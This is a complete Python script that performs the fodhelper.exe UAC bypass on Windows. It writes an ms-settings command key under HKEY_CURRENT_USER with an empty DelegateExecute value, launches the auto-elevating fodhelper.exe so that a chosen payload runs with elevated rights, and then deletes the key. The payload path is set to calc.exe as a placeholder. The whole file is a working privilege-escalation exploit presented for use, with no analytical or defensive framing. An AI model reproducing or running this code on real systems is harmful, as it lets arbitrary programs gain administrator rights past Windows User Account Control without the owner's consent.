import os
import sys
import subprocess
import winreg

FODHELPER_PATH = r"C:\Windows\System32\fodhelper.exe"
PAYLOAD_PATH   = r"C:\Windows\System32\calc.exe"
REG_PATH = r"Software\Classes\ms-settings\Shell\Open\command"

def create_uac_bypass_registry():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, PAYLOAD_PATH)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)
        return True
    except Exception:
        return False

def remove_uac_bypass_registry():
    try:
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, REG_PATH)
    except FileNotFoundError:
        pass
    except Exception:
        pass

def execute_with_fodhelper():
    try:
        subprocess.run(
            [FODHELPER_PATH],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return True
    except Exception:
        return False

def cleanup():
    remove_uac_bypass_registry()

def main():
    if not os.path.exists(PAYLOAD_PATH):
        print("[-] Payload not found:", PAYLOAD_PATH)
        sys.exit(1)

    if not create_uac_bypass_registry():
        print("[-] Failed to write registry.")
        sys.exit(1)

    try:
        if not execute_with_fodhelper():
            print("[-] Failed to launch fodhelper.")
            sys.exit(1)
    finally:
        cleanup()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cleanup()
        sys.exit(0)
